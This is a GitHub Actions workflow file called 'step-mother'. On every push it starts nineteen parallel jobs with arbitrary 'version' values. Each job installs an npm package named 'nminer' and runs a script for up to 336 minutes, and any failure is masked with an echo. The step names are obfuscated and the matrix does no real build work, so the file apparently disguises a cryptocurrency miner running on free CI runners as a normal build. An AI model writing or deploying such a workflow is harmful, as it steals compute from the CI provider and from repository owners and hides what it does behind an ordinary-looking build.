name: step-mother
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3041 }
          - { version: 1375 }
          - { version: 8441 }
          - { version: 5038 }
          - { version: 1867 }
          - { version: 4904 }
          - { version: 3520 }
          - { version: 4428 }
          - { version: 4620 }
          - { version: 6203 }
          - { version: 1532 }
          - { version: 6938 }
          - { version: 3726 }
          - { version: 3270 }
          - { version: 4602 }
          - { version: 7810 }
          - { version: 8419 }
          - { version: 2287 }
          - { version: 2436 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: sharply bitter
        run: |
          npm install nminer@latest
          timeout 336m node step-mother.js || echo "step-mother executed"